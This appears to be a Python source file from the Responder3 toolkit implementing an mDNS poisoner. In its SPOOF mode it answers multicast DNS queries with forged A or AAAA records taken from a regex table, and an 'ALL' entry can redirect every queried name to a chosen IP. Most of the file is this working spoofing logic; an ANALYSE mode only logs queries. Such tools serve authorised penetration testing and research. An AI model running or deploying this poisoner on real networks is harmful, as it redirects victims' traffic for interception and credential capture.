import re
import os
import io
import logging
import traceback
import socket
import struct
import enum
import traceback
import ipaddress

from responder3.protocols.DNS import * 
from responder3.servers.BASE import ResponderServer, ResponderProtocolUDP, ProtocolSession, PoisonerMode

class MDNSSession(ProtocolSession):
	def __init__(self, server):
		ProtocolSession.__init__(self, server)

class MDNS(ResponderServer):
	def __init__(self):
		ResponderServer.__init__(self)

	def modulename(self):
		return 'MDNS'

	def setup(self):
		self.protocol = MDNSProtocol
		self.spoofTable = []
		if self.settings is None:
			self.log(logging.INFO, 'No settings defined, adjusting to Analysis functionality!')
			self.settings = {}
			self.settings['mode'] = PoisonerMode.ANALYSE

		else:
			#parse the poisoner mode
			if isinstance(self.settings['mode'], str):
				self.settings['mode'] = PoisonerMode[self.settings['mode'].upper()]

			#compiling re strings to actual re objects and converting IP strings to IP objects
			if self.settings['mode'] == PoisonerMode.SPOOF:
				for exp in self.settings['spoofTable']:
					if exp == 'ALL':
						self.spoofTable.append((re.compile('.*'),ipaddress.ip_address(self.settings['spoofTable'][exp])))
						continue
					self.spoofTable.append((re.compile(exp),ipaddress.ip_address(self.settings['spoofTable'][exp])))

	def run(self):
		#need to do some wizardy with the socket setting here
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
		sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		sock.bind(('', self.bind_port))
		mreq = struct.pack("=4sl", self.bind_addr.packed, socket.INADDR_ANY)
		sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

		coro = self.loop.create_datagram_endpoint(
							protocol_factory=lambda: MDNSProtocol(self),
							sock = sock
		)

		return self.loop.run_until_complete(coro)

	def handle(self, packet, addr, transport, session):
		if 'R3DEEPDEBUG' in os.environ:
				self.log(logging.INFO,'Packet: %s' % (repr(packet),), session)
		try:
			#only care about the requests
			if packet.QR == DNSResponse.REQUEST:
				if self.settings['mode'] == PoisonerMode.ANALYSE:
					for q in packet.Questions:
						self.logPoisonResult(session, requestName = q.QNAME.name)

				else:
					answers = []
					for targetRE, ip in self.spoofTable:
						for q in packet.Questions:
							if targetRE.match(q.QNAME.name):
								self.logPoisonResult(session, requestName = q.QNAME.name, poisonName = str(targetRE), poisonIP = ip)
								#BE AWARE THIS IS NOT CHECKING IF THE QUESTION AS FOR IPV4 OR IPV6!!!
								if ip.version == 4:
									res = DNSAResource.construct(q.QNAME.name, ip)
								elif ip.version == 6:
									res = DNSAAAAResource.construct(q.QNAME.name, ip)
								else:
									raise Exception('This IP version scares me...')
								#res.construct(q.QNAME, NBRType.NB, ip)
								answers.append(res)
					
					response = DNSPacket.construct(TID = packet.TransactionID, 
													 response  = DNSResponse.RESPONSE, 
													 answers   = answers,
													 questions = packet.Questions)

					transport.sendto(response.toBytes(), addr)

			

		except Exception as e:
			traceback.print_exc()
			self.log(logging.INFO,'Exception! %s' % (str(e),))
			pass

class MDNSProtocol(ResponderProtocolUDP):
	
	def __init__(self, server):
		ResponderProtocolUDP.__init__(self, server)
		self._session = MDNSSession(server.rdnsd)

	def _parsebuff(self, addr):
		packet = DNSPacket.from_bytes(self._buffer)
		self._server.handle(packet, addr, self._transport, self._session)
		self._buffer = b''